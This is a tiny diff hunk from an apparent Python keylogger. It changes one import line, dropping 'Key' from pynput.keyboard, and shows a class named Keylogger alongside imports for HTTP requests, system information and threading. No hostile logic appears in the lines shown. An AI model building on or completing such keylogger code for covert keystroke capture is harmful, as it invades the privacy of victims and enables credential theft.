@@ -5,7 +5,7 @@ from sys import exit
 from platform import uname
 from requests import get
 from _thread import start_new_thread
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 
 
 class Keylogger:
